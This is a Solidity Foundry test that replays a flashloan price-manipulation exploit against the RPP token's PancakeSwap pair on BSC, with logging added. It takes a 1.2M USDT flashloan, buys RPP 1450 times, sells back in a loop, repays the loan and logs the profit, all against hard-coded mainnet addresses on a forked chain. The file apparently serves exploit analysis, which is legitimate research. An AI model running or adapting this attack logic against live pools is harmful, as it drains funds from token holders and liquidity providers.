// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// Instrumented copy of the RPP exploit to log ground-truth reserve numbers.
// Does NOT modify the original RPP_exp.sol. Mirrors its attack logic exactly.

address constant PANCAKE_V3_POOL_T = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
address constant PANCAKE_V2_ROUTER_T = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant WBNB_ADDR_T = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant BSC_USD_T = 0x55d398326f99059fF775485246999027B3197955;
address constant RPP_TOKEN_T = 0x7d1a69302D2A94620d5185f2d80e065454a35751;
address constant RPP_PAIR_T = 0x7F42d51DB070454251c2B0B6922128BB2cf768E9;

interface IPair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
}

contract RPP_trace is Test {
    uint256 blocknumToForkFrom = 43_752_882 - 1;

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8546", blocknumToForkFrom);
    }

    function logState(string memory tag, address atk) internal view {
        // pair: token0 = USDT (reserve0), token1 = RPP (reserve1)
        (uint112 r0, uint112 r1,) = IPair(RPP_PAIR_T).getReserves();
        console.log("---- %s ----", tag);
        console.log("  USDT reserve (e18):", uint256(r0));
        console.log("  RPP  reserve (e18):", uint256(r1));
        console.log("  RPP totalSupply   :", IERC20(RPP_TOKEN_T).totalSupply());
        console.log("  attacker USDT bal :", IERC20(BSC_USD_T).balanceOf(atk));
        console.log("  attacker RPP  bal :", IERC20(RPP_TOKEN_T).balanceOf(atk));
        console.log("  pair RPP balance  :", IERC20(RPP_TOKEN_T).balanceOf(RPP_PAIR_T));
    }

    function testTrace() public {
        TraceAttack a = new TraceAttack(address(this));
        a.start();
    }

    receive() external payable {}
}

contract TraceAttack is Test {
    address owner;
    uint256 borrowedAmount = 1_200_000_000_000_000_000_000_000;
    address atkAddr;

    constructor(address _o) {
        owner = _o;
        atkAddr = address(this);
    }

    function logState(string memory tag) internal view {
        (uint112 r0, uint112 r1,) = IPair(RPP_PAIR_T).getReserves();
        console.log("---- %s ----", tag);
        console.log("  USDT reserve:", uint256(r0));
        console.log("  RPP  reserve:", uint256(r1));
        console.log("  RPP supply  :", IERC20(RPP_TOKEN_T).totalSupply());
        console.log("  atk USDT    :", IERC20(BSC_USD_T).balanceOf(atkAddr));
        console.log("  atk RPP     :", IERC20(RPP_TOKEN_T).balanceOf(atkAddr));
        console.log("  pair RPP bal:", IERC20(RPP_TOKEN_T).balanceOf(RPP_PAIR_T));
    }

    function start() public {
        TokenHelper.approveToken(BSC_USD_T, PANCAKE_V2_ROUTER_T, type(uint256).max);
        TokenHelper.approveToken(RPP_TOKEN_T, PANCAKE_V2_ROUTER_T, type(uint256).max);
        IPancakeV3PoolActions(PANCAKE_V3_POOL_T).flash(address(this), borrowedAmount, 0, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        logState("STATE 0 - start of callback (after flashloan)");

        uint256 times = 1450;
        for (uint256 i = 0; i < times; i++) {
            address[] memory path = new address[](2);
            path[0] = BSC_USD_T;
            path[1] = RPP_TOKEN_T;
            IPancakeRouter(payable(PANCAKE_V2_ROUTER_T)).swapTokensForExactTokens(
                99_999_999_999_999_999_999_999,
                1_200_000_000_000_000_000_000_000,
                path,
                address(this),
                block.timestamp + 100_000_000
            );
            if (i == 0) logState("STATE 1 - after FIRST buy (i=0)");
            if (i == 724) logState("STATE 1b - after buy #725 (i=724)");
        }
        logState("STATE 2 - after ALL 1450 buys");

        uint256 sells = 0;
        while (true) {
            uint256 rppBalance = TokenHelper.getTokenBalance(RPP_TOKEN_T, address(this));
            address[] memory path = new address[](2);
            path[0] = RPP_TOKEN_T;
            path[1] = BSC_USD_T;
            IPancakeRouter(payable(PANCAKE_V2_ROUTER_T)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                99_999_999_999_999_999_999_999, 0, path, address(this), block.timestamp + 100_000_000
            );
            sells++;
            if (sells == 1) logState("STATE 3 - after FIRST sell");
            if (rppBalance <= 134_160_000_000_000_000_000_000_214) break;
        }
        console.log("==== total sells:", sells);
        logState("STATE 4 - after sell loop ends");

        TokenHelper.transferToken(BSC_USD_T, PANCAKE_V3_POOL_T, borrowedAmount + fee0);
        console.log("==== flash fee0:", fee0);
        logState("STATE 5 - after repaying flashloan");
        console.log("==== FINAL atk USDT profit:", IERC20(BSC_USD_T).balanceOf(atkAddr));
    }

    receive() external payable {}
}
